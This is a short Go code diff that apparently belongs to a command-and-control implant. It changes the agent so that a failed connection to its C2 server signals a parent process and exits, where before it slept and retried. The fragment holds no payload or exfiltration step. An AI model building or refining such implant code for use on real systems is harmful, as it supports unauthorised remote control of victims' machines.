@@ -289,9 +289,9 @@ connect:
 	conn, ctx, cancel, err := c2transport.ConnectCC(msgURL)
 	def.CCMsgConn = conn
 	if err != nil {
-		log.Printf("Connect CC failed: %v, sleeping, will retry later", err)
-		util.TakeASnap()
-		goto connect
+		log.Printf("Connect CC failed: %v, signaling parent and exiting", err)
+		conditionalC2FailNotify()
+		return
 	}
 	def.KCPKeep = true
 	log.Println("Connecting to CC message tunnel...")
